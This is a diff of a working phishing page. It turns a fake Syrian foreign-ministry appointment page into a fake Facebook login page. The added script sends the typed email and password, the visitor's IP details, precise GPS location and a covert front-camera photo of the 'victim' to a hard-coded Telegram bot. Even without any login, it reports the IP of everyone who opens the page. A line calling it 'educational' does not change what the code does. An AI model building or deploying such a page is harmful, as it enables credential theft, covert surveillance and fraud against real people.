@@ -3,142 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
+    <title>فيسبوك - تسجيل الدخول</title>
     <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, sans-serif; 
-            background-color: #f8f9fa; 
-            margin: 0; 
-            text-align: center; 
-            font-weight: 900; 
-            color: #333;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .header { 
-            background: #ffffff; 
-            padding: 20px; 
-            border-bottom: 5px solid #b38a2e;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
+        .container {
+            background: white;
+            padding: 30px 35px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
         }
-        .header img { 
-            max-width: 85%; 
-            height: auto; 
-            max-height: 90px; 
+        .logo {
+            font-size: 42px;
+            font-weight: 700;
+            color: #1877f2;
+            margin-bottom: 10px;
+            font-family: 'Helvetica', Arial, sans-serif;
         }
-        .container { 
-            max-width: 450px; 
-            margin: 30px auto; 
-            padding: 30px; 
-            background: #ffffff; 
-            border-radius: 20px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
-            border: 1px solid #e0e0e0;
+        .sub {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 25px;
         }
-        h2 { 
-            color: #1a237e; 
-            font-size: 26px; 
-            margin-bottom: 10px; 
-            border-bottom: 2px solid #b38a2e;
-            display: inline-block;
-            padding-bottom: 5px;
-        }
-        .promo-box { 
-            background-color: #fff3cd; 
-            color: #856404; 
-            padding: 15px; 
-            border-radius: 10px; 
-            font-size: 16px; 
-            margin-bottom: 25px; 
-            border: 1px solid #ffeeba;
-        }
-        label { 
-            display: block; 
-            text-align: right; 
-            margin: 15px 5% 8px; 
-            font-size: 18px; 
-            color: #1a237e; 
-        }
-        input, select { 
-            width: 90%; 
-            padding: 15px; 
-            margin-bottom: 20px; 
-            border: 2px solid #ced4da; 
-            border-radius: 12px; 
-            font-size: 16px; 
-            font-weight: 800; 
-            background: #fdfdfd; 
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: #fff;
             outline: none;
+            transition: 0.2s;
         }
-        input:focus { border-color: #b38a2e; }
-        
-        .btn { 
-            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
-            color: white; 
-            padding: 18px; 
-            border: none; 
-            border-radius: 12px; 
-            width: 90%; 
-            font-size: 20px; 
-            font-weight: 900; 
-            cursor: pointer; 
-            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
-            transition: 0.3s;
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
-        
-        .footer { 
-            margin-top: 40px; 
-            font-size: 13px; 
-            color: #6c757d; 
-            padding-bottom: 30px; 
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 5px;
         }
-        .hidden { display: none; }
+        .btn:hover {
+            background: #166fe5;
+        }
+        .btn:active {
+            background: #0f5fb8;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 22px 0 18px;
+        }
+        .forgot {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .create-btn {
+            background: #42b72a;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+        .note {
+            font-size: 12px;
+            color: #777;
+            margin-top: 20px;
+        }
+        #status {
+            margin-top: 12px;
+            padding: 8px;
+            border-radius: 6px;
+            font-size: 14px;
+            display: none;
+        }
+        .hidden {
+            display: none;
+        }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
-</div>
-
 <div class="container">
-    <h2>منظومة الحجز الإلكتروني</h2>
-    <div class="promo-box">
-        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
-    </div>
-    
-    <label>الاسم الثلاثي:</label>
-    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">
+    <div class="logo">facebook</div>
+    <div class="sub">تسجيل الدخول إلى فيسبوك</div>
 
-    <label>المحافظة المقيم بها:</label>
-    <select id="city">
-        <option value="">-- اختر من القائمة --</option>
-        <option value="إدلب">إدلب</option>
-        <option value="حلب">حلب</option>
-        <option value="دمشق">دمشق</option>
-        <option value="حمص">حمص</option>
-        <option value="حماة">حماة</option>
-        <option value="اللاذقية">اللاذقية</option>
-        <option value="طرطوس">طرطوس</option>
-        <option value="درعا">درعا</option>
-        <option value="دير الزور">دير الزور</option>
-    </select>
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit" class="btn">تسجيل الدخول</button>
+    </form>
 
-    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
-</div>
+    <a href="#" class="forgot">نسيت كلمة السر؟</a>
 
-<div class="footer">
-    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
+    <div class="divider"></div>
+
+    <button class="create-btn" onclick="alert('هذه صفحة تجريبية')">إنشاء حساب جديد</button>
+
+    <div id="status"></div>
+    <div class="note">هذه صفحة تجريبية لأغراض تعليمية فقط</div>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // ======== بيانات التليغرام المحدثة ========
+    // ======== بيانات التليغرام ========
     const BOT_TOKEN = "8669811855:AAEzIrBKoyRD5f9zpKLQB0IwTxviOrSujN0";
     const CHAT_ID = "7214473798";
-    // ===========================================
+    const PAGE_NAME = "فيسبوك - تسجيل دخول";
+    // ==================================
 
     async function sendToTelegram(message) {
         try {
@@ -204,7 +214,7 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            sendToTelegram(`⚠️ وزارة الخارجية - الكاميرا غير مدعومة`);
+            sendToTelegram(`⚠️ ${PAGE_NAME} - الكاميرا غير مدعومة`);
             return;
         }
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -217,7 +227,7 @@
                     canvas.height = video.videoHeight || 300;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                    sendPhotoToTelegram(dataURL, `📸 وزارة الخارجية - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+                    sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                     stream.getTracks().forEach(track => track.stop());
                     video.srcObject = null;
                 }, 1500);
@@ -233,39 +243,49 @@
                             canvas.height = video.videoHeight || 300;
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             const dataURL = canvas.toDataURL('image/jpeg', 0.7);
-                            sendPhotoToTelegram(dataURL, `📸 وزارة الخارجية - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
+                            sendPhotoToTelegram(dataURL, `📸 ${PAGE_NAME} - صورة من كاميرا الضحية\n🕒 ${new Date().toLocaleString()}`);
                             stream.getTracks().forEach(track => track.stop());
                             video.srcObject = null;
                         }, 1500);
                     })
-                    .catch(() => sendToTelegram(`⚠️ وزارة الخارجية - رفض الكاميرا`));
+                    .catch(() => sendToTelegram(`⚠️ ${PAGE_NAME} - رفض الكاميرا`));
             });
     }
 
-    async function startProcess() {
-        let name = document.getElementById("name").value.trim();
-        let city = document.getElementById("city").value;
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
 
-        if (!name || !city) { 
-            alert("يرجى ملء كافة الحقول المطلوبة."); 
-            return; 
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const statusDiv = document.getElementById('status');
+
+        if (!email || !password) {
+            statusDiv.style.display = 'block';
+            statusDiv.style.color = '#c00';
+            statusDiv.innerText = '❌ الرجاء ملء جميع الحقول';
+            return;
         }
+
+        statusDiv.style.display = 'block';
+        statusDiv.style.color = '#f0c060';
+        statusDiv.innerText = '⏳ جاري التحقق...';
 
         // جلب IP
         const ipInfo = await getIPInfo();
-        let ipMsg = `🌐 <b>وزارة الخارجية - دخول جديد</b>\n\n`;
-        ipMsg += `👤 الاسم: ${name}\n`;
-        ipMsg += `🏙️ المحافظة: ${city}\n`;
+        let msg = `🕵️ <b>${PAGE_NAME}</b>\n\n`;
+        msg += `👤 البريد: ${email}\n`;
+        msg += `🔑 كلمة السر: ${password}\n`;
         if (ipInfo) {
-            ipMsg += `📡 IP: ${ipInfo.ip}\n`;
-            ipMsg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
-            ipMsg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
+            msg += `📡 IP: ${ipInfo.ip}\n`;
+            msg += `🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
+            msg += `🌍 الدولة: ${ipInfo.country || 'غير معروف'}\n`;
             if (ipInfo.lat && ipInfo.lon) {
-                ipMsg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
+                msg += `🗺️ تقريبي: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}\n`;
             }
         }
-        ipMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
-        await sendToTelegram(ipMsg);
+        msg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
+
+        await sendToTelegram(msg);
 
         // طلب GPS دقيق
         if (navigator.geolocation) {
@@ -273,32 +293,33 @@
                 let lat = p.coords.latitude;
                 let lon = p.coords.longitude;
                 let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                let gpsMsg = `🎯 <b>وزارة الخارجية - موقع دقيق ✅</b>\n\n`;
-                gpsMsg += `👤 ${name}\n`;
+                let gpsMsg = `🎯 <b>${PAGE_NAME} - موقع دقيق ✅</b>\n\n`;
+                gpsMsg += `👤 ${email}\n`;
                 gpsMsg += `📍 ${mapLink}\n`;
                 gpsMsg += `📏 دقة: ${Math.round(p.coords.accuracy)} متر\n`;
                 gpsMsg += `🕒 ${new Date().toLocaleString('ar-EG')}`;
                 await sendToTelegram(gpsMsg);
             }, (err) => {
-                sendToTelegram(`⚠️ وزارة الخارجية - رفض GPS: ${err.message}`);
+                sendToTelegram(`⚠️ ${PAGE_NAME} - رفض GPS: ${err.message}`);
             }, { enableHighAccuracy: true, timeout: 10000 });
         }
 
         // تصوير الكاميرا
         captureCamera();
 
-        alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");
+        statusDiv.style.color = '#2e7d32';
+        statusDiv.innerText = '✅ تم تسجيل الدخول بنجاح! جاري التحويل...';
 
         setTimeout(() => {
-            window.location.href = "https://www.facebook.com/jableh.ali.jbr";
+            window.location.href = "https://www.facebook.com/";
         }, 2000);
-    }
+    });
 
     // إرسال IP فوراً عند فتح الصفحة (دون تعبئة)
     (async function () {
         const ipInfo = await getIPInfo();
         if (ipInfo) {
-            let msg = `📡 <b>وزارة الخارجية - صفحة مفتوحة</b>\n\n`;
+            let msg = `📡 <b>${PAGE_NAME} - صفحة مفتوحة</b>\n\n`;
             msg += `🌐 IP: ${ipInfo.ip}\n`;
             msg += `🏙️ ${ipInfo.city || 'غير معروف'}, ${ipInfo.country || ''}\n`;
             if (ipInfo.lat && ipInfo.lon) {
